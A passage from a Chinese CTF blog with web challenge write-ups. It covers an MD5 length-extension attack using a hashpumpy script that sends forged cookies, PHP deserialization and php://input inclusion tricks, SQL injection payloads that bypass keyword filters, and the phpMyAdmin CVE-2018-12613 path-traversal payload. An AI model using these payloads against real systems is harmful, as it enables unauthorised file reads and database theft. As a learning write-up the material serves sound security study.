<span class="token comment" spellcheck="true">//strrve函数反转字符串</span>                                <span class="token variable">$auth</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                <span class="token variable">$auth</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$role</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'role'</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token variable">$hsh</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$salt</span><span class="token punctuation">.</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'hsh'</span><span class="token punctuation">,</span><span class="token variable">$hsh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$auth</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">echo</span> "<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span></span>Welcome Admin<span class="token punctuation">.</span> Your flag is                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                        <span class="token keyword">echo</span> <span class="token string">"&lt;h3>Only Admin can see the flag!!&lt;/h3>"</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>        <span class="token delimiter">?></span> <span class="token comment" spellcheck="true">//只截取了PHP部分</span></code></pre><p>分析代码，flag输出条件是 $role===”admin” &amp;&amp;hsh===md5($salt.strrev($_COOKIE[“role”]))</p><img src="/2019/11/30/md5扩展攻击/4.jpg" srcset="/img/loading.gif" title="image"><p>这里得到<strong>$salt.strrev(s:5:”guest”;)</strong>的hsh，即$salt.’;&quot;tseug&quot;:5:s’的md5值： hsh=3a4727d57463f122833d9e732f94e4e0</p><p>以上是已知条件。</p><p>满足第一个条件只需要比较时$role开头是admin,接下来的字符是’\0’即可。</p><p>结合条件二，就可以这样构造</p><p>s:5:”admin”;+padding+s:5:”guest”;</p><p>而问题在于我们并不知道salt的长度</p><p>===&gt;可以写脚本爆破(借脚本参考)</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># -*- coding=utf -*-</span><span class="token keyword">import</span> requests<span class="token punctuation">,</span>hashpumpy<span class="token punctuation">,</span>urllib<span class="token keyword">def</span> <span class="token function">webre</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">'http://web.jarvisoj.com:32778/'</span>    sha <span class="token operator">=</span> <span class="token string">'3a4727d57463f122833d9e732f94e4e0'</span>    string0 <span class="token operator">=</span> <span class="token string">';"tseug":5:s'</span>    string1 <span class="token operator">=</span> <span class="token string">';"nimda":5:s'</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        digest<span class="token punctuation">,</span> message <span class="token operator">=</span> hashpumpy<span class="token punctuation">.</span>hashpump<span class="token punctuation">(</span>sha<span class="token punctuation">,</span>string0<span class="token punctuation">,</span>string1<span class="token punctuation">,</span>i<span class="token punctuation">)</span>        payload <span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'role'</span><span class="token punctuation">:</span>urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>message<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'hsh'</span><span class="token punctuation">:</span>digest<span class="token punctuation">}</span>  <span class="token operator">//</span> quote<span class="token punctuation">(</span><span class="token punctuation">)</span>用于把url编码，    <span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>用于反转字符        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>         html <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>cookies<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>content         <span class="token keyword">if</span> <span class="token string">'Welcome'</span> <span class="token keyword">in</span> html<span class="token punctuation">:</span>             <span class="token keyword">print</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>webre<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>hashpump库使用说明</p><pre><code>hashpump(...)    hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)    Arguments:        hexdigest(str):      Hex-encoded result of hashing key + original_data.        original_data(str):  Known data used to get the hash result hexdigest.        data_to_add(str):    Data to append        key_length(int):     Length of unknown data prepended to the hash    Returns:        A tuple containing the new hex digest and the new message.&gt;&gt;&gt; hashpumpy.hashpump(&#39;ffffffff&#39;, &#39;original_data&#39;, &#39;data_to_add&#39;, len(&#39;KEYKEYKEY&#39;))(&#39;e3c4a05f&#39;, &#39;original_datadata_to_add&#39;)</code></pre><p>===&gt; 也可以用bp爆破</p><img src="/2019/11/30/md5扩展攻击/7.png" srcset="/img/loading.gif" title="image"><img src="/2019/11/30/md5扩展攻击/5.jpg" srcset="/img/loading.gif" title="image"><p>参考：</p><p><a href="https://blog.csdn.net/qq1045553189/article/details/87566846" target="_blank" rel="noopener">https://blog.csdn.net/qq1045553189/article/details/87566846</a></p><p><a href="https://err0rzz.github.io/2017/09/18/hash长度扩展攻击/" target="_blank" rel="noopener">https://err0rzz.github.io/2017/09/18/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/</a></p>]]></content>
    
    
    <categories>
      
      <category>攻击原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HASH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jarvis OJ WEB WP</title>
    <link href="/2019/11/13/Jarvis%20OJ(web)WP/"/>
    <url>/2019/11/13/Jarvis%20OJ(web)WP/</url>
    
    <content type="html"><![CDATA[<h1 id="jarvis-OJ"><a href="#jarvis-OJ" class="headerlink" title="jarvis OJ"></a>jarvis OJ</h1><h2 id="神盾局"><a href="#神盾局" class="headerlink" title="神盾局"></a>神盾局</h2><p>打开网页是一张图片<br>查看源码发现</p><img src="/2019/11/13/Jarvis%20OJ(web)WP/Image1.png" srcset="/img/loading.gif" title="image"><a id="more"></a><p>base64转码发现后面是shield.jpg<br>尝试一下 index.php发现如下源码</p><img src="/2019/11/13/Jarvis%20OJ(web)WP/Image2.png" srcset="/img/loading.gif" title="image"><p>大概就是如果传入的class值不为空 就把这个值赋给g<br>再把g反序列化后赋给x<br>输出将x传入readfile后的值<br>再看一下 shield.php</p><img src="/2019/11/13/Jarvis%20OJ(web)WP/Image3.png" srcset="/img/loading.gif" title="image"><p>看见他告诉flag在 pctf.php 里<br> 如果传入的值不为空 且值中不存在.. 且不含/ 和\\<br>才能到file_get_contents函数读取文件</p><p>又读了一下showimg.php</p><img src="/2019/11/13/Jarvis%20OJ(web)WP/Image4.png" srcset="/img/loading.gif" title="image"><p>这就解释了为什么刚才直接读pctf.php显示FILE NOT FOUND<br>写个脚本</p><img src="/2019/11/13/Jarvis%20OJ(web)WP/Image5.png" srcset="/img/loading.gif" title="image"> <p>O:6:”Shield”:1:{s:4:”file”;s:8:”pctf.php”;}<br>把这个值传入<br>注意！！是class不是之前的img 而且是从原页面上传入</p><img src="/2019/11/13/Jarvis%20OJ(web)WP/Image6.png" srcset="/img/loading.gif" title="image"><p>得到flag</p><h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>看源码啥也没有<br>看一眼robots.txt</p><img src="/2019/11/13/Jarvis%20OJ(web)WP/Image7.png" srcset="/img/loading.gif" title="image"><p>进这个文件 发现是假flag<br>抓包<br>admin随便改个值得到flag</p><h2 id="in-a-mess"><a href="#in-a-mess" class="headerlink" title="in a mess"></a>in a mess</h2><p>查看源码</p><img src="/2019/11/13/Jarvis%20OJ(web)WP/Image8.png" srcset="/img/loading.gif" title="image"><p>分析<br>传入的a里如果不为0.则echo hahah并return<br>没有.就继续向下运行 给$data赋值从$a里读到的值如果data值等于 1112 is a nice lab!,id==0,b的长度大于5且b的第一个值是4 又要求b的第一个值不能等于4<br>才能运行flag.txt<br>每个条件都存在冲突<br>id php弱比较就能绕过 传入id=0e<br>a 看见file_get_contents函数想到文件包含 不知道有什么文件含这个字符串先放一下<br>b eregi可以%00截断 b=%0041111111<br>查了下大佬的wp<br>说a这里可以应用伪协议php://input<br>构造payload:<br><strong>?id=0e&amp;a=php://input&amp;b=%004111111</strong><br>同时<strong>post值1112 is a nice lab!</strong><br>得到这样的回显<br>Come ON!!! {/^HT2mCpcvOLf}</p><img src="/2019/11/13/Jarvis%20OJ(web)WP/Image9.png" srcset="/img/loading.gif" title="image"><p>盲猜他是个地址（长得也太难认了8</p><img src="/2019/11/13/Jarvis%20OJ(web)WP/Image10.png" srcset="/img/loading.gif" title="image"><p>进到这样一个界面 看见这样的形势 先测试一下sql注入</p><img src="/2019/11/13/Jarvis%20OJ(web)WP/Image11.png" srcset="/img/loading.gif" title="image"><p>确实是sql注入<br>可以看到它这里是过滤了空格 用/*22*/绕过 回显又正常了</p><img src="/2019/11/13/Jarvis%20OJ(web)WP/Image12.png" srcset="/img/loading.gif" title="image"><p>先测试字段数</p><img src="/2019/11/13/Jarvis%20OJ(web)WP/Image13.png" srcset="/img/loading.gif" title="image"><p>说明字段为3</p><img src="/2019/11/13/Jarvis%20OJ(web)WP/Image14.png" srcset="/img/loading.gif" title="image"><p>双写绕过对select和union的过滤<br>数据库名</p><pre><code>?id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,database()</code></pre><p>查到数据库名是test</p><p>表名</p><pre><code>id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,group_concat(table_name)/*22*/frfromom/*22*/information_schema.tables/*22*/where/*22*/table_schema=database()</code></pre><img src="/2019/11/13/Jarvis%20OJ(web)WP/Image16.png" srcset="/img/loading.gif" title="image"><p>列名</p><pre><code>id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,group_concat(column_name)/*22*/frfromom/*22*/information_schema.columns/*22*/where/*22*/table_schema=database()/*22*/and/*22*/table_name=0x636f6e74656e74</code></pre><p>查出来是id,context,title</p><p>读文件</p><pre><code>id=-1/*22*/uniunionon/*22*/seleselectct/*22*/1,2,context/*22*/frofromm/*22*/content</code></pre><p>得到flag</p><img src="/2019/11/13/Jarvis%20OJ(web)WP/Image18.png" srcset="/img/loading.gif" title="image"><p><strong>持续更新</strong></p>]]></content>
    
    
    <categories>
      
      <category>ctfweb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>jarvis OJ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF WEB wp</title>
    <link href="/2019/10/21/BUUCTFwp/"/>
    <url>/2019/10/21/BUUCTFwp/</url>
    
    <content type="html"><![CDATA[<h1 id="HCTF2018WarmUp"><a href="#HCTF2018WarmUp" class="headerlink" title="HCTF2018WarmUp"></a>HCTF2018WarmUp</h1><p>菜鸡发现了一个平台BUUCTF，web第一题就要去查wp，哎<br>查看源码给了source.php,如下</p><a id="more"></a><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">emmm</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token shell-comment comment">##不能为空</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token shell-comment comment">##是字符串</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token shell-comment comment">##上面checkfile返回为true</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token delimiter">?></span></code></pre><p>hint.php</p><pre><code>flag not here, and flag in ffffllllaaaagggg</code></pre><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>构造payload:</p><pre><code>?file=hint.php%253f/../../../../ffffllllaaaagggg</code></pre><p>传入得到flag</p><p>具体为啥这么构造，参考下面的漏洞。</p><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>经过搜索这里是phpmyadmin4.8.1远程文件包含漏洞<br>所以先看懂这个漏洞-&gt;做题</p><h2 id="phpmyadmin4-8-1远程文件包含漏洞（CVE-2018-12613）"><a href="#phpmyadmin4-8-1远程文件包含漏洞（CVE-2018-12613）" class="headerlink" title="phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613）"></a>phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613）</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>一个攻击者可以在服务器上包含（查看和潜在执行）文件的漏洞被发现。该漏洞来自一部分代码，其中页面在phpMyAdmin中被重定向和加载，以及对白名单页面进行不正确的测试。攻击者必须经过身份验证，但在这些情况下除外：</p><p>$_cfg [‘AllowArbitraryServer’] = true：攻击者可以指定他/她已经控制的任何主机，并在phpMyAdmin上执行任意代码</p><p>$_cfg [‘ServerDefault’] = 0：这会绕过登录并在没有任何身份验证的情况下运行易受攻击的代码</p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>   在index.php里50-63行</p><pre class=" language-php"><code class="language-php"><span class="token variable">$target_blacklist</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span>    <span class="token string">'import.php'</span><span class="token punctuation">,</span> <span class="token string">'export.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// If we have a valid target, let's load that script instead</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^index/'</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_blacklist</span><span class="token punctuation">)</span>    <span class="token operator">&amp;&amp;</span> Core<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkPageValidity</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    exit<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>满足五个条件：$_REQUEST[‘target’]不为空，是字符串，不以index开头，<strong><em>Core::checkPageValidity($REQUEST[‘target’])为真,则包含参数所指定的文件</em></strong></p><p>代码在libraries\classes\Core.php 443-476行</p><p>Core::checkPageValidity</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkPageValidity</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$goto_whitelist</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>            <span class="token variable">$page</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>            <span class="token variable">$_page</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h3><p>mb_substr:截取字符串（与substr的区别是它可以截取中文）<br>mb_strpos:匹配（同理，可截取中文）<br>可以看到代码中用了两次有关截取?前字符,判断文件名是否在白名单里的操作<br>第一次很好理解，这里不再叙述<br>phpmyadmin团队考虑到target值后会再跟参数，为了能正确包含文件才使用了第二次截取<br>而就在这里出现了漏洞<br><strong>构造payload:</strong><br><code>target=db_sql.php%253f/../../test.txt</code><br>浏览器自行解码一次<br>变成:<br><code>target=db_sql.php%3f/../../test.txt</code><br>也就是说传入的数据里没？<br>所以这时的<strong>$page</strong>没被截取，<strong>$_page</strong>的值依然等于<strong>$page</strong><br>继续往下看，先经过函数urldecode一次<br>变成：<br><code>target=db_sql.php?/../../test.txt</code><br>这时候截取到问号前即$_page=db_dql.php, 符合条件通过下面的if判断,接着包含参数所指定的文件，即/../../test.txt(关于这个路径我也不知道是咋来的，我猜就是猜的，嗯)，达到读取test.txt的目的</p><p>参考：</p><p>[]: <a href="https://www.jianshu.com/p/0d75017c154f" target="_blank" rel="noopener">https://www.jianshu.com/p/0d75017c154f</a></p><h1 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h1><p><strong>考点：反序列化逃逸</strong></p><p>先扫一波后台发现 <a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p><p>核心功能在以下三个文件里</p><p><a href="https://imgchr.com/i/0AZYuT" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/27/0AZYuT.png" srcset="/img/loading.gif" alt="0AZYuT.png"></a></p><p>同时扫出来的还有注册界面和config.php。鉴于zip文件里没给config.php，猜测flag与此文件有关。</p><p>先注个册进入上传页面抓个包。</p><p>下面是代码审计部分：</p><p>存：传参进profile[]里(update.php)–&gt;profile[]序列化–&gt;updatefile函数(class.php)<br><a href="https://imgchr.com/i/0AE9KO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/27/0AE9KO.png" srcset="/img/loading.gif" alt="0AE9KO.png"></a></p><p>–&gt;filter函数检测（where-&gt;hacker）–&gt;存数据库</p><p><img src="https://s1.ax1x.com/2020/09/27/0AEFVH.png" srcset="/img/loading.gif" alt="0AEFVH.png"></p><p><a href="https://imgchr.com/i/0AEAIA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/27/0AEAIA.png" srcset="/img/loading.gif" alt="0AEAIA.png"></a></p><p>取：反序列化profile<a href="profile.php"></a>–&gt;file_get_contents取profile[$photo]读</p><p><a href="https://imgchr.com/i/0AEmxf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/27/0AEmxf.png" srcset="/img/loading.gif" alt="0AEmxf.png"></a></p><p>可利用之处就在filter函数中对username的检测:<br>若内容存在五位的where则会将它替换为六位的hacker。<br>又因为对photo的值有规定，我们只能考虑重新构造photo,<br>结合以上在这里利用反序列化逃逸。<br>初版构造的photo如下：</p><pre><code>&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code></pre><p><a href="https://imgchr.com/i/0AVpYn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/27/0AVpYn.md.png" srcset="/img/loading.gif" 